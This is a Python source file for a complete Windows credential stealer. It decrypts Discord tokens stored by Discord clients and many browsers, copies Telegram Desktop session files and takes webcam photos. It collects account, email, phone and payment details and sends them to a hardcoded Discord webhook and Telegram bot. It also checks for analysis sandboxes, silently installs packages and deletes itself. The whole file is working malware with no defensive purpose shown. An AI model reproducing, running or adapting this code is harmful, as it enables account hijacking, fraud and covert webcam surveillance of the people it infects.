# discord_grabber.py (modified: Discord token via webhook, sessions via Telegram bot)
import os
if os.name != "nt":
    exit()
import subprocess
import sys
import json
import urllib.request
import re
import base64
import datetime
import time
import shutil

def install_import(modules):
    for module, pip_name in modules:
        try:
            __import__(module)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            os.execl(sys.executable, sys.executable, *sys.argv)

install_import([("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome"), ("psutil", "psutil"), ("requests", "requests"), ("cv2", "opencv-python")])

import win32crypt
from Crypto.Cipher import AES
import psutil
import requests
import cv2

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Lightcord': ROAMING + '\\Lightcord',
    'Discord PTB': ROAMING + '\\discordptb',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Amigo': LOCAL + '\\Amigo\\User Data',
    'Torch': LOCAL + '\\Torch\\User Data',
    'Kometa': LOCAL + '\\Kometa\\User Data',
    'Orbitum': LOCAL + '\\Orbitum\\User Data',
    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
    'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + '\\Default',
    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Default',
    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
}

class Settings:
    CaptureGames = True
    CaptureTelegram = True

class Utility:
    @staticmethod
    def GetLnkFromStartMenu(name):
        start_menu = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs")
        results = []
        for root, _, files in os.walk(start_menu):
            for file in files:
                if file.lower().startswith(name.lower()) and file.endswith(".lnk"):
                    results.append(os.path.join(root, file))
        return results

    @staticmethod
    def GetLnkTarget(lnk_path):
        try:
            import win32com.client
            shell = win32com.client.Dispatch("WScript.Shell")
            shortcut = shell.CreateShortCut(lnk_path)
            return shortcut.Targetpath
        except:
            return None

class Logger:
    @staticmethod
    def info(message):
        print(f"[INFO] {message}")

class Grabber:
    def __init__(self):
        self.TempFolder = os.path.join(os.getenv("TEMP"), "Grabber")
        self.TelegramSessionsCount = 0
        self.WebcamImagesCount = 0
        os.makedirs(self.TempFolder, exist_ok=True)
        self.tg_bot_token = "8210492721:AAHb5hA9ywaZ5gMJr6S_I1YruMz2akCakWI"
        self.tg_chat_id = "7234535860"

    def getheaders(self, token=None):
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
        }
        if token:
            headers.update({"Authorization": token})
        return headers

    def gettokens(self, path):
        path += "\\Local Storage\\leveldb\\"
        tokens = []
        if not os.path.exists(path):
            return tokens
        for file in os.listdir(path):
            if not file.endswith(".ldb") and file.endswith(".log"):
                continue
            try:
                with open(f"{path}{file}", "r", errors="ignore") as f:
                    for line in (x.strip() for x in f.readlines()):
                        for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                            tokens.append(values)
            except PermissionError:
                continue
        return tokens
    
    def getkey(self, path):
        with open(path + f"\\Local State", "r") as file:
            key = json.loads(file.read())['os_crypt']['encrypted_key']
            file.close()
        return key

    def getip(self):
        try:
            with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
                return json.loads(response.read().decode()).get("ip")
        except:
            return "None"

    def is_sandbox(self):
        sandbox_processes = [
            "vboxservice.exe",
            "vboxtray.exe",
            "vmtoolsd.exe",
            "vmwaretray.exe",
            "vmwareuser.exe",
            "vgauthservice.exe",
            "vgtray.exe",
            "wireshark.exe",
            "procmon.exe",
            "tcpview.exe"
        ]
        for proc in psutil.process_iter(['name']):
            if proc.info['name'].lower() in [p.lower() for p in sandbox_processes]:
                return True
        return False

    def StealTelegramSessions(self) -> None:  # Steals telegram session(s) files
        if Settings.CaptureTelegram:
            Logger.info("Stealing telegram sessions")
            telegramPaths = [*set([os.path.dirname(x) for x in [Utility.GetLnkTarget(v) for v in Utility.GetLnkFromStartMenu("Telegram")] if x is not None])]
            multiple = len(telegramPaths) > 1
            saveToDir = os.path.join(self.TempFolder, "Messenger", "Telegram")
            
            if not telegramPaths:
                telegramPaths.append(os.path.join(os.getenv("APPDATA"), "Telegram Desktop"))

            for index, telegramPath in enumerate(telegramPaths):
                tDataPath = os.path.join(telegramPath, "tdata")
                loginPaths = []
                files = []
                dirs = []
                has_key_datas = False

                if os.path.isdir(tDataPath):
                    for item in os.listdir(tDataPath):
                        itempath = os.path.join(tDataPath, item)
                        if item == "key_datas":
                            has_key_datas = True
                            loginPaths.append(itempath)
                        
                        if os.path.isfile(itempath):
                            files.append(item)
                        else:
                            dirs.append(item)
                
                    for filename in files:
                        for dirname in dirs:
                            if dirname + "s" == filename:
                                loginPaths.extend([os.path.join(tDataPath, x) for x in (filename, dirname)])
            
                if has_key_datas and len(loginPaths) - 1 > 0:
                    _saveToDir = saveToDir
                    if multiple:
                        _saveToDir = os.path.join(_saveToDir, "Profile %d" % (index + 1))
                    os.makedirs(_saveToDir, exist_ok=True)

                    failed = False
                    for loginPath in loginPaths:
                        try:
                            if os.path.isfile(loginPath):
                                shutil.copy(loginPath, os.path.join(_saveToDir, os.path.basename(loginPath)))
                            else:
                                shutil.copytree(loginPath, os.path.join(_saveToDir, os.path.basename(loginPath)), dirs_exist_ok=True)
                        except Exception:
                            shutil.rmtree(_saveToDir)
                            failed = True
                            break
                    if not failed:
                        self.TelegramSessionsCount += int((len(loginPaths) - 1)/2)
            
            if self.TelegramSessionsCount and multiple:
                with open(os.path.join(saveToDir, "Info.txt"), "w") as file:
                    file.write("Multiple Telegram installations are found, so the files for each of them are put in different Profiles")

    def capture_images(self, num_images=1):
        num_cameras = 0
        cameras = []
        temp_path = self.TempFolder
        webcam_dir = os.path.join(temp_path, "Webcam")
        os.makedirs(webcam_dir, exist_ok=True)

        while True:
            cap = cv2.VideoCapture(num_cameras)
            if not cap.isOpened():
                break
            cameras.append(cap)
            num_cameras += 1

        if num_cameras == 0:
            return

        for _ in range(num_images):
            for i, cap in enumerate(cameras):
                ret, frame = cap.read()
                if ret:
                    image_path = os.path.join(webcam_dir, f"image_from_camera_{i}.jpg")
                    cv2.imwrite(image_path, frame)
                    self.WebcamImagesCount += 1

        for cap in cameras:
            cap.release()

    def main(self):
        webhook_url = "https://discord.com/api/webhooks/1408074946823061584/5-TtHlkjiJXt0ggykFuoiJ_g87B319KIvEw_PLYTTFn1C6MLdOgJ0kVeWYF-X2Oshpr8"

        if self.is_sandbox():
            time.sleep(40)

        self.StealTelegramSessions()
        self.capture_images()

        checked = []
        for platform, path in PATHS.items():
            if not os.path.exists(path):
                continue

            for token in self.gettokens(path):
                token = token.replace("\\", "") if token.endswith("\\") else token
                try:
                    token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(self.getkey(path))[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
                    if token in checked:
                        continue
                    checked.append(token)

                    res = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me', headers=self.getheaders(token)))
                    if res.getcode() != 200:
                        continue
                    res_json = json.loads(res.read().decode())

                    badges = ""
                    flags = res_json['flags']
                    if flags == 64 or flags == 96:
                        badges += ":BadgeBravery: "
                    if flags == 128 or flags == 160:
                        badges += ":BadgeBrilliance: "
                    if flags == 256 or flags == 288:
                        badges += ":BadgeBalance: "

                    params = urllib.parse.urlencode({"with_counts": True})
                    res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/users/@me/guilds?{params}', headers=self.getheaders(token))).read().decode())
                    guilds = len(res)
                    guild_infos = ""

                    for guild in res:
                        if guild['permissions'] & 8 or guild['permissions'] & 32:
                            res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/guilds/{guild["id"]}', headers=self.getheaders(token))).read().decode())
                            vanity = ""
                            if res["vanity_url_code"] != None:
                                vanity = f"""; .gg/{res["vanity_url_code"]}"""
                            guild_infos += f"""\nㅤ- [{guild['name']}]: {guild['approximate_member_count']}{vanity}"""
                    if guild_infos == "":
                        guild_infos = "No guilds"

                    res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v6/users/@me/billing/subscriptions', headers=self.getheaders(token))).read().decode())
                    has_nitro = bool(len(res) > 0)
                    exp_date = None
                    if has_nitro:
                        badges += f":BadgeSubscriber: "
                        exp_date = datetime.datetime.strptime(res[0]["current_period_end"], "%Y-%m-%dT%H:%M:%S.%f%z").strftime('%d/%m/%Y at %H:%M:%S')

                    res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=self.getheaders(token))).read().decode())
                    available = 0
                    print_boost = ""
                    boost = False
                    for id in res:
                        cooldown = datetime.datetime.strptime(id["cooldown_ends_at"], "%Y-%m-%dT%H:%M:%S.%f%z")
                        if cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
                            print_boost += f"ㅤ- Available now\n"
                            available += 1
                        else:
                            print_boost += f"ㅤ- Available on {cooldown.strftime('%d/%m/%Y at %H:%M:%S')}\n"
                        boost = True
                    if boost:
                        badges += f":BadgeBoost: "

                    payment_methods = 0
                    type = ""
                    valid = 0
                    for x in json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=self.getheaders(token))).read().decode()):
                        if x['type'] == 1:
                            type += "CreditCard "
                            if not x['invalid']:
                                valid += 1
                            payment_methods += 1
                        elif x['type'] == 2:
                            type += "PayPal "
                            if not x['invalid']:
                                valid += 1
                            payment_methods += 1

                    print_nitro = f"\nNitro Informations:\n```yaml\nHas Nitro: {has_nitro}\nExpiration Date: {exp_date}\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
                    nnbutb = f"\nNitro Informations:\n```yaml\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
                    print_pm = f"\nPayment Methods:\n```yaml\nAmount: {payment_methods}\nValid Methods: {valid} method(s)\nType: {type}\n```"
                    embed_user = {
                        'embeds': [
                            {
                                'title': f"**New user data: {res_json['username']}**",
                                'description': f"""
                                    ```yaml\nUser ID: {res_json['id']}\nEmail: {res_json['email']}\nPhone Number: {res_json['phone']}\n\nGuilds: {guilds}\nAdmin Permissions: {guild_infos}\n``` ```yaml\nMFA Enabled: {res_json['mfa_enabled']}\nFlags: {flags}\nLocale: {res_json['locale']}\nVerified: {res_json['verified']}\n```{print_nitro if has_nitro else nnbutb if available > 0 else ""}{print_pm if payment_methods > 0 else ""}```yaml\nIP: {self.getip()}\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {platform}\n```Token: \n```yaml\n{token}```""",
                                'color': 3092790,
                                'footer': {
                                    'text': "Made by Dope"
                                },
                                'thumbnail': {
                                    'url': f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json['avatar']}.png"
                                }
                            }
                        ],
                        "username": "Grabber",
                        "avatar_url": "https://avatars.githubusercontent.com/u/43183806?v=4"
                    }

                    urllib.request.urlopen(urllib.request.Request(webhook_url, data=json.dumps(embed_user).encode('utf-8'), headers=self.getheaders(), method='POST')).read().decode()
                except urllib.error.HTTPError or json.JSONDecodeError:
                    continue
                except Exception as e:
                    print(f"ERROR: {e}")
                    continue

            files_to_send = [] 
            
            import zipfile
            
            if self.TelegramSessionsCount > 0:
                telegram_dir = os.path.join(self.TempFolder, "Messenger", "Telegram")
                telegram_zip_path = os.path.join(self.TempFolder, "Telegram.zip")
                with zipfile.ZipFile(telegram_zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                    for root, _, files in os.walk(telegram_dir):
                        for file in files:
                            zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), os.path.join(self.TempFolder, "Messenger")))
                files_to_send.append(telegram_zip_path)
                print("[DEBUG] Telegram zip created")
            
            if self.WebcamImagesCount > 0:
                webcam_dir = os.path.join(self.TempFolder, "Webcam")
                webcam_zip_path = os.path.join(self.TempFolder, "Webcam.zip")
                with zipfile.ZipFile(webcam_zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                    for root, _, files in os.walk(webcam_dir):
                        for file in files:
                            zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), webcam_dir))
                files_to_send.append(webcam_zip_path)
                print("[DEBUG] Webcam zip created")

            description = f"Stolen Sessions\nTelegram Sessions: {self.TelegramSessionsCount}\nWebcam Images: {self.WebcamImagesCount}"
            requests.post(f"https://api.telegram.org/bot{self.tg_bot_token}/sendMessage", data={"chat_id": self.tg_chat_id, "text": description})
            print("[DEBUG] Description sent to Telegram")

            for file_path in files_to_send:
                with open(file_path, 'rb') as f:
                    requests.post(f"https://api.telegram.org/bot{self.tg_bot_token}/sendDocument", data={"chat_id": self.tg_chat_id}, files={"document": f})
                print(f"[DEBUG] {os.path.basename(file_path)} sent to Telegram")

        time.sleep(20)
        os.remove(sys.argv[0])

if __name__ == "__main__":
    grabber = Grabber()
    grabber.main()